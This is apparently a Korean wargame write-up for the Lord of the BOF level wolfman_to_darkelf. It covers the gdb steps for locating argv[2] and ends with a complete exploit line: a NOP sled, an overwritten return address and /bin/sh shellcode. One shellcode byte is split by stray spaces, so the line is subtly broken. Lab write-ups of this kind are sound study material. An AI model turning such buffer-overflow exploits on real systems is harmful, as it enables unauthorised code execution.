#week2  
##lob  
###wolfman_to_darkelf  
코드를 확인해보면 이 문제는 egghunter,buffer hunter에 추가하여 argv[1]의 길이를 확인한다.  
이때까지 argv[1]의 길이는 48로 유지했으니 앞의 것들과 방법은 동일하다.  
cp wolfman solfman(같은 길이의 이름)을 해주고   
gdb solfman 해준다.   
disas main을 해준 다음 브레이크 포인트를 strcpy함수가 호출되고 나서인 main+245에 잡아준다.  
r $(python -c 'print("\xbf"*48+" "+"A"*125)')을 한다.  
그리고 x/100s $esp+100 명령어를 통해 argv[2] 주소를 확인    
x/100s $esp+100: esp+100의 주소로부터 100줄의 문자열을 출력한다.    
argv[2]의 주소를 확인했다면 아래와 같은 코드를 완성하면 끝!!!!  
./darkelf $(python -c 'print("\x90"*44+"\xf0\xfb\xff\xbf"+"  "+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\       xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')  

